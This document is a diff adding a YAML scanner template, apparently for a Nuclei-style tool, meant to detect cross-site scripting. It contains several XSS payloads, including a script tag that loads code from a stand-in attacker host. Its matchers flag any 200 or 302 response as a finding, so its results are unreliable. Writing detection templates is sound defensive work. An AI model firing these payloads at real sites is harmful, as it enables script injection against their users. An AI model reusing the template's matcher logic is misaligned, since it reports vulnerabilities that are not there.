@@ -1,0 +1,49 @@
+id: xss-detection-advanced
+info:
+  name: Advanced XSS Detection
+  author: Your Name
+  severity: high
+
+requests:
+  - name: XSS Payloads
+    type: http
+    method: POST
+    path: ["/"]
+    headers:
+      Content-Type: ["application/x-www-form-urlencoded"]
+    body:
+      payload: |
+        <script>alert("XSS1")</script>
+        <img src="x" onerror="alert('XSS2')">
+        <svg onload="alert('XSS3')"></svg>
+        <img src=x:alert(1)>
+        <script src=https://attacker.site/evil.js></script>
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+      - type: word
+        words:
+          - "XSS1"
+          - "XSS2"
+          - "XSS3"
+
+  - name: URL Parameter Injection
+    type: http
+    method: GET
+    path: ["/"]
+    params:
+      q: "<script>alert(\"XSS4\")</script>"
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+      - type: word
+        words:
+          - "XSS4"
